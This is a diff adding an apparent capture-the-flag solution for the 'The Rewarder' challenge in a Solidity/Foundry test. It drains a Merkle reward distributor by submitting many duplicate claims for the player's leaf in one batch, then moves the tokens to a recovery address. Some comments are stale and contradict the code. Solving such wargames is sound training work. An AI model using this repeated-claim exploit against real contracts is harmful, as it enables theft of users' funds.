@@ -148,7 +148,48 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        uint256 PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+        uint256 PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+
+        console.log("address(player)");
+        console.log(address(player));
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        uint256 dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_CLAIM_AMOUNT;
+        uint256 wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM_AMOUNT;
+        uint256 totalTxCount = dvtTxCount + wethTxCount;
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        // Create Alice's claims
+        Claim[] memory claims = new Claim[](totalTxCount);
+
+        for (uint256 i = 0; i < totalTxCount; i++) {
+            if (i < dvtTxCount) {
+                claims[i] = Claim({
+                    batchNumber: 0, // claim corresponds to first DVT batch
+                    amount: PLAYER_DVT_CLAIM_AMOUNT,
+                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                    proof: merkle.getProof(dvtLeaves, 188) // Alice's address is at index 2
+                });
+            } else {
+                claims[i] = Claim({
+                    batchNumber: 0, // claim corresponds to first DVT batch
+                    amount: PLAYER_WETH_CLAIM_AMOUNT,
+                    tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
+                    proof: merkle.getProof(wethLeaves, 188) // Alice's address is at index 2
+                });
+            }
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
